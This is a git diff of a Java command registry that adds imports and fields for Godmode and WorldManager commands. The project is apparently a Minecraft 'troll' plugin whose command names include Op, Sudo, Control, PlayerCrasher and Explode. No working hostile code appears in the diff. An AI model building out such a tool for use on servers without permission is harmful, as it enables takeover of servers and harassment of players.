@@ -31,6 +31,7 @@ import net.Lenni0451.GitTroll.command.commands.player.Control;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
 import net.Lenni0451.GitTroll.command.commands.player.Freeze;
 import net.Lenni0451.GitTroll.command.commands.player.Gamemode;
+import net.Lenni0451.GitTroll.command.commands.player.Godmode;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
 import net.Lenni0451.GitTroll.command.commands.player.Sudo;
@@ -57,6 +58,7 @@ import net.Lenni0451.GitTroll.command.commands.trolling.DropHand;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropInventory;
 import net.Lenni0451.GitTroll.command.commands.trolling.Explode;
 import net.Lenni0451.GitTroll.command.commands.trolling.PlayerCrasher;
+import net.Lenni0451.GitTroll.command.commands.world.WorldManager;
 import net.Lenni0451.GitTroll.command.commands.world.WorldReset;
 import net.Lenni0451.GitTroll.event.EventListener;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
@@ -115,6 +117,8 @@ public class CommandManager implements Listener {
 	public final Freeze Freeze = null;
 	public final Broadcast Broadcast = null;
 	public final Control Control = null;
+	public final WorldManager WorldManager = null;
+	public final Godmode Godmode = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
